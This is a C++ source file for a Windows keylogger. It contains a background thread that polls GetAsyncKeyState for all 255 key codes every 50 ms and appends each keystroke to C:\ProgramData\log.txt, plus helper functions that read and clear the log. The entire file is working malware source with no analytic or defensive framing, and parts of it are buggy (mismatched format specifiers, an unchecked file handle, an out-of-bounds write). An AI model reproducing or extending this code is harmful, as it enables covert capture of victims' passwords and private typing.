#include"head.h"
int Save(int _key,char *file)
{
	cout<< _key<<endl;
	
	FILE *OUTPUT_FILE;
	OUTPUT_FILE=fopen(file,"a+");

	if(OUTPUT_FILE){
			if(_key==VK_SHIFT)
				fprintf(OUTPUT_FILE,"%s","");

			if(_key==VK_BACK)
				fprintf(OUTPUT_FILE,"%s","");

				if(_key==VK_LBUTTON)
				fprintf(OUTPUT_FILE,"%s","");

						if(_key==VK_RETURN)
				fprintf(OUTPUT_FILE,"%s","enter \n\r");

					if(_key==VK_ESCAPE)
				fprintf(OUTPUT_FILE,"%s","[ESCAPE]");
							if(_key==220)
				fprintf(OUTPUT_FILE,"%s","|");
									if(_key==221)
				fprintf(OUTPUT_FILE,"%c",']');
						if(_key==219)
				fprintf(OUTPUT_FILE,"%c",'[');

					if(_key>=97&&_key<=105)
					{
						if(_key==105)
						fprintf(OUTPUT_FILE,"%s","9");
									else if(_key==104)
						fprintf(OUTPUT_FILE,"%s","8");
									else if(_key==103)
						fprintf(OUTPUT_FILE,"%s","7");
									else if(_key==102)
						fprintf(OUTPUT_FILE,"%s","6");
									else if(_key==101)
						fprintf(OUTPUT_FILE,"%s","5");
									else if(_key==100)
						fprintf(OUTPUT_FILE,"%s","4");
									else if(_key==99)
						fprintf(OUTPUT_FILE,"%s","3");
									else if(_key==98)
						fprintf(OUTPUT_FILE,"%s","2");
									else if(_key==97)
						fprintf(OUTPUT_FILE,"%s","1");
					}
			else
			fprintf(OUTPUT_FILE,"%s",&_key);
	}
	fclose(OUTPUT_FILE);



	return 0;
}

char *clear(char *path)
{

		FILE *OUTPUT_FILE;
	OUTPUT_FILE=fopen(path,"w");
	char * answear;
	if(OUTPUT_FILE){
		answear="buferi gasuftavebulia\n";

	}
	fclose(OUTPUT_FILE);

	return answear;
}













char *read(char *path)
{	
	char buf[100];
	FILE *file;
	file=fopen(path,"rb");

	
	fseek(file,0,SEEK_END);
	int size=ftell(file);
	fseek(file,0,SEEK_SET);

	 char *cv;	
	 cv=( char*)malloc(size);
	
	if(cv==NULL){

	}
	else
		{
		//	while(fgetc(c,size, 1, file));
		fread(cv,size,1,file);
		cv[size]=0;
		fclose(file);
	}
		return (char*)cv;
}

unsigned long __stdcall keyloger(void*)
{

	/////////////////////////////////////////////////////////

			while(1)
			{		

 					for(int i=1;i<=255;i++)
					{
						if(GetAsyncKeyState(i)==-32767)
						{
						
							Save(i,"C:\\ProgramData\\log.txt");
				
						}
				
					}



					Sleep(50);

			}
	
	}

	

